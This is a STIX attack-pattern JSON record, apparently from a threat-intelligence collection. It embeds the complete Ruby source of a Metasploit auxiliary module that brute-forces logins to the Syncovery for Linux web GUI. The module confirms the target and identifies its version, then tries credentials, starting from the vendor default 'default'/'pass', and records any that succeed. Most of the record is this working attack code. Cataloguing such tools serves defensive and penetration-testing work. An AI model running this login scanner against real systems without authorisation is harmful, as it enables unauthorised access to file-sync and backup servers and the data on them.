{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d0d28446-67e7-40b1-98bf-ac4bbd80c65c",
    "created": "2024-08-14T16:30:44.332312Z",
    "modified": "2024-08-14T16:30:44.332316Z",
    "name": "Syncovery For Linux Web-GUI Login Utility",
    "description": "This module will attempt to authenticate to Syncovery File Sync & Backup Software For Linux Web-GUI.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/syncovery_linux_login.rb",
            "external_id": "syncovery_linux_login.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'metasploit/framework/login_scanner/syncovery_file_sync_backup'\nrequire 'metasploit/framework/credential_collection'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Syncovery For Linux Web-GUI Login Utility',\n        'Description' => 'This module will attempt to authenticate to Syncovery File Sync & Backup Software For Linux Web-GUI.',\n        'Author' => [ 'Jan Rude' ],\n        'License' => MSF_LICENSE,\n        'Platform' => 'linux',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => []\n        },\n        'DefaultOptions' => {\n          'RPORT' => 8999,\n          'USERNAME' => 'default',\n          'PASSWORD' => 'pass',\n          'STOP_ON_SUCCESS' => true # There is only one user\n        }\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(8999), # Default is HTTP: 8999; HTTPS: 8943\n        OptString.new('USERNAME', [true, 'The username to Syncovery (default: default)', 'default']),\n        OptString.new('PASSWORD', [false, 'The password to Syncovery (default: pass)', 'pass']),\n        OptString.new('TARGETURI', [false, 'The path to Syncovery', '/'])\n      ]\n    )\n\n    deregister_options('PASSWORD_SPRAY')\n  end\n\n  def scanner(ip)\n    @scanner ||= lambda {\n      cred_collection = build_credential_collection(\n        username: datastore['USERNAME'],\n        password: datastore['PASSWORD']\n      )\n\n      return Metasploit::Framework::LoginScanner::SyncoveryFileSyncBackup.new(\n        configure_http_login_scanner(\n          host: ip,\n          port: datastore['RPORT'],\n          uri: datastore['TARGETURI'],\n          cred_details: cred_collection,\n          stop_on_success: datastore['STOP_ON_SUCCESS'],\n          bruteforce_speed: datastore['BRUTEFORCE_SPEED'],\n          connection_timeout: 5,\n          http_username: datastore['HttpUsername'],\n          http_password: datastore['HttpPassword']\n        )\n      )\n    }.call\n  end\n\n  def report_good_cred(ip, port, result)\n    service_data = {\n      address: ip,\n      port: port,\n      service_name: 'http',\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      module_fullname: fullname,\n      origin_type: :service,\n      private_data: result.credential.private,\n      private_type: :password,\n      username: result.credential.public\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      last_attempted_at: DateTime.now,\n      status: result.status,\n      proof: result.proof\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def report_bad_cred(ip, rport, result)\n    invalidate_login(\n      address: ip,\n      port: rport,\n      protocol: 'tcp',\n      public: result.credential.public,\n      private: result.credential.private,\n      realm_key: result.credential.realm_key,\n      realm_value: result.credential.realm,\n      status: result.status,\n      proof: result.proof\n    )\n  end\n\n  # Attempts to login\n  def bruteforce(ip)\n    scanner(ip).scan! do |result|\n      case result.status\n      when Metasploit::Model::Login::Status::SUCCESSFUL\n        print_brute(level: :good, ip: ip, msg: \"Success: '#{result.credential}'\")\n        report_good_cred(ip, rport, result)\n      when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT\n        vprint_brute(level: :verror, ip: ip, msg: result.proof)\n        report_bad_cred(ip, rport, result)\n      when Metasploit::Model::Login::Status::INCORRECT\n        vprint_brute(level: :verror, ip: ip, msg: \"Failed: '#{result.credential}'\")\n        report_bad_cred(ip, rport, result)\n      end\n    end\n  end\n\n  # Start here\n  def run_host(ip)\n    if scanner(ip).check_setup\n      vprint_brute(level: :good, ip: ip, msg: 'Syncovery File Sync & Backup Software confirmed')\n    else\n      print_brute(level: :error, ip: ip, msg: 'Target is not Syncovery File Sync & Backup Software')\n      return\n    end\n\n    version = scanner(ip).get_version\n    if !version\n      vprint_brute(level: :error, ip: ip, msg: 'Unknown version')\n    else\n      vprint_brute(level: :good, ip: ip, msg: \"Identified version: #{version}\")\n    end\n\n    bruteforce(ip)\n  end\nend\n",
    "x_mitre_platforms": [
        "linux'"
    ]
}